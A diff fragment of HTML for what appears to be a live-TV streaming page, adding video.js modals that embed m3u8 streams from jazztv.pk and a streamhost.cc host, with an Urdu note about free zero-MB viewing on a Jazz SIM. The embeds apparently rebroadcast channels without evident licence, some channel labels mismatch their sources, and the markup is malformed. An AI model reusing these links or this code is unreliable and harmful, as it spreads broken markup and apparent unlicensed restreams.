+                <!-- Modal content-->
+
+                <div class="modal-content">
+
+                    <div class="modal-header">
+                        <h4 class="Arain">GurmaniTmlm</h4>
+
+                    </div>
+
+                    <i class="fa fa-eye" aria-hidden="true"></i>
+                    <h6 id="visits13" style="text-align: center; margin-top: 30px;color:black;"> 
+                        <span> </span>
+                    </h6>
+                    <h6 style="text-align: center;margin-left: 70px; margin-top: -23px;color:black;">Viewers </h6>
+                    <div class="modal-body">
+
+
+
+                        <video id="my-video13" class="video-js vjs-default-skin vjs-fluid" controls preload="none"
+                            width="16" height="9" poster="https://up4net.com/uploads4/up4net.com164216223958571.png" data-setup="{}">
+                            <source src="https://cdn2.jazztv.pk:8087/jazzauth/DunyaNews-113/playlist.m3u8"
+                                type='application/x-mpegURL'>
+                            <source src="https://cdn2.jazztv.pk:8087/jazzauth/DunyaNews-113/playlist.m3u8"
+                                type='application/x-mpegURL'>
+                            <p class="vjs-no-js">
+                                To view this video please enable JavaScript, and consider upgrading to a
+                                web browser
+                                that
+                                <li data-url=="http://videojs.com/html5-video-support/" target="_blank">
+                                    supports HTML5
+                                    video </a>
+
+                            </p>
+                        </video>
+
+
+
+
+
+
+                    </div>
+
+
+                    <div class="modal-footer">
+                        <button type="button" class="button2" data-dismiss="modal"
+                            onclick="videojs('my-video13').pause()">Back</button>
+
+نوٹ :  فل سکرین کے لیے پہلے موبائل کا آٹوروٹیٹ آن کریں۔ پھر موبائل کو گھمائیں اور فول بٹن پر کلک کریں۔ یہ چینل جاز کی سم سے فری ہے۔ آپ اس کو زیرو ایم بی پر بھی چلا سکتے ہیں
+                    </div>
+
+
+
+                </div>
+
+
+
+
+            </div>
+
+        </div>
+
+
+
+        <!-- ModalNO#14 -->
+        <div style="width: 100%;" class="modal fade" id="myModal14" role="dialog">
+            <div class="modal-dialog">
+
+                <!-- Modal content-->
+
+                <div class="modal-content">
+
+                    <div class="modal-header">
+                        <h4 class="Arain">BEIN SPORTS HD </h4>
+
+                    </div>
+
+                    <i class="fa fa-eye" aria-hidden="true"></i>
+                    <h6 id="visits14" style="text-align: center; margin-top: 30px;color:black;"> 
+                        <span> </span>
+                    </h6>
+                    <h6 style="text-align: center;margin-left: 70px; margin-top: -23px;color:black;">Viewers </h6>
+                    <div class="modal-body">
+
+
+
+                        <video id="my-video14" class="video-js vjs-default-skin vjs-fluid" controls preload="none"
+                            width="16" height="9" poster="https://up4net.com/uploads4/up4net.com164216223958571.png" data-setup="{}">
+                            <source src="https://cdn2.jazztv.pk:8087/jazzauth/ptv-home-174/playlist.m3u8"
+                                type='application/x-mpegURL'>
+                            <source src="https://cdn2.jazztv.pk:8087/jazzauth/ptv-home-174/playlist.m3u8"
+                                type='application/x-mpegURL'>
+                            <p class="vjs-no-js">
+                                To view this video please enable JavaScript, and consider upgrading to a
+                                web browser
+                                that
+                                <li data-url=="http://videojs.com/html5-video-support/" target="_blank">
+                                    supports HTML5
+                                    video </a>
+
+                            </p>
+                        </video>
+
+
+
+
+
+
+                    </div>
+
+
+                    <div class="modal-footer">
+                        <button type="button" class="button2" data-dismiss="modal"
+                            onclick="videojs('my-video14').pause()">Back</button>
+
+نوٹ :  فل سکرین کے لیے پہلے موبائل کا آٹوروٹیٹ آن کریں۔ پھر موبائل کو گھمائیں اور فول بٹن پر کلک کریں۔ یہ چینل جاز کی سم سے فری ہے۔ آپ اس کو زیرو ایم بی پر بھی چلا سکتے ہیں
+
+                    </div>
+
+
+
+                </div>
+
+
+
+
+            </div>
+
+        </div>
+
+
+
+
+
+
+    </div>
+
+
+    <!-- ModalNO#15 -->
+    <div style="width: 100%;" class="modal fade" id="myModal15" role="dialog">
+        <div class="modal-dialog">
+
+            <!-- Modal content-->
+
+            <div class="modal-content">
+
+                <div class="modal-header">
+                    <h4 class="Arain">BEIN SPORTS 6 HD </h4>
+
+                </div>
+
+                <i class="fa fa-eye" aria-hidden="true"></i>
+                <h6 id="count" style="text-align: center; margin-top: 30px;color:black;"> 
+                    <span> </span>
+                </h6>
+                <h6 style="text-align: center;margin-left: 80px; margin-top: -23px;color:black;">Viewers </h6>
+                <div class="modal-body">
+
+
+
+                    <video id="my-video15" class="video-js vjs-default-skin vjs-fluid" controls preload="none"
+                        width="16" height="9" poster="https://up4net.com/uploads4/up4net.com164216223958571.png" data-setup="{}">
+                        <source src="http://4ce5e2d62ee2c10e43c709f9b87c44d5.streamhost.cc/m3u8/Sports/fa0ce095e9977d8.m3u8"
+                            type='application/x-mpegURL'>
+                        <source src="http://4ce5e2d62ee2c10e43c709f9b87c44d5.streamhost.cc/m3u8/Sports/fa0ce095e9977d8.m3u8"
+                            type='application/x-mpegURL'>
+                        <p class="vjs-no-js">
+                            To view this video please enable JavaScript, and consider upgrading to a
+                            web browser
+                            that
+                            <li data-url=="http://videojs.com/html5-video-support/" target="_blank">
+                                supports HTML5
+                                video </a>
+
+                        </p>
+                    </video>
+
+
+
+
+
+
+                </div>
+
+
+                <div class="modal-footer">
+                    <button type="button" class="button2" data-dismiss="modal"
+                        onclick="videojs('my-video15').pause()">Back</button>
+
+نوٹ :  فل سکرین کے لیے پہلے موبائل کا آٹوروٹیٹ آن کریں۔ پھر موبائل کو گھمائیں اور فول بٹن پر کلک کریں۔ یہ چینل جاز کی سم سے فری ہے۔ آپ اس کو زیرو ایم بی پر بھی چلا سکتے ہیں
+                </div>
+
+
+
+            </div>
+
+
+
+
+        </div>
+
+    </div>
+
+
+
+
+
+
+
+    <!-- ModalNO#16 -->
+    <div style="width: 100%;" class="modal fade" id="myModal16" role="dialog">
+        <div class="modal-dialog">
+
+            <!-- Modal content-->
+
+            <div class="modal-content">
+
+                <div class="modal-header">
+                    <h4 class="Arain">Gurmani</h4>
+
+                </div>
+
+                <i class="fa fa-eye" aria-hidden="true"></i>
+                <h6 id="visits16" style="text-align: center; margin-top: 30px;color:black;"> 
+                    <span> </span>
+                </h6>
+                <h6 style="text-align: center;margin-left: 70px; margin-top: -23px;color:black;">Viewers </h6>
+                <div class="modal-body">
+
+
+
+                    <video id="my-video16" class="video-js vjs-default-skin vjs-fluid" controls preload="none"
+                        width="16" height="9" poster="https://up4net.com/uploads4/up4net.com164216223958571.png" data-setup="{}">
+                        <source src="https://cdn2.jazztv.pk:8087/jazzauth/Urdu1-158-4/playlist.m3u8"
+                            type='application/x-mpegURL'>
+                        <source src="https://cdn2.jazztv.pk:8087/jazzauth/Urdu1-158-4/playlist.m3u8"
+                            type='application/x-mpegURL'>
+                        <p class="vjs-no-js">
+                            To view this video please enable JavaScript, and consider upgrading to a
+                            web browser
+                            that
+                            <li data-url=="http://videojs.com/html5-video-support/" target="_blank">
+                                supports HTML5
+                                video </a>
+
+                        </p>
